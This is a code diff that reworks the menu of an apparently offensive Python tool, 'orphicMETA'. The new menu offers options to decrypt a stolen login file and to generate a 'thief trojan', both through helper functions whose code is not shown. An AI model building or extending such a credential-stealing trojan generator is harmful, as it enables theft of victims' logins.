@@ -21,26 +21,35 @@ def main():
 
     def Console():
         clear()
-        opshell = Style.BRIGHT + Fore.LIGHTMAGENTA_EX + "orphicMETA>" + Style.RESET_ALL
-        main = input(opshell)
+        banner = r"""
+             ██████╗ ██████╗ ██████╗ ██╗  ██╗██╗ ██████╗
+            ██╔═══██╗██╔ ═██╗██╔══██╗██║  ██║██║██╔════╝
+            ██║   ██║██████╔╝██████╔╝███████║██║██║   
+            ██║   ██║██╔══██╗██╔═══  ██╔══██║██║██║  
+            ╚██████╔╝██║  ██║██║     ██║  ██║██║╚██████╗
+             ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝╚═╝ ╚═════╝
+             | ---------------- META ------------------- |
+             """
 
-        if(main == "help"):
-            print("Fancy help message coming soon...")
-            input("")
-        elif(main == "decrypt"):
+        opshell = Style.BRIGHT + Fore.LIGHTBLUE_EX + "[1] Decrypt a Login File..\n[2] Generate a Theif Trojan..\n==>" + Style.RESET_ALL
+        print(banner)
+        main = input(opshell)
+        if(main == "1"):
             filename = input(tag_blue + " Enter Filename : ")
             try:
-                lfile = open(filename, "r")
+                lfile = open(filename, "r+")
                 decryptFile(filename)
                 lfile.close()
                 input("")
             except FileNotFoundError:
-                print(opshell +" File not Found!")
+                print(tag_red+" File not Found!")
                 input()
-        elif(main == "gen"):
+        elif(main == "2"):
             trojan = input("[+] Enter Filename : ")
             generate_file(trojan)
             input("==> press enter..")
+        else:
+            print(tag_red + " Unidentified input!?")
     while(True):
         try:
             Console()
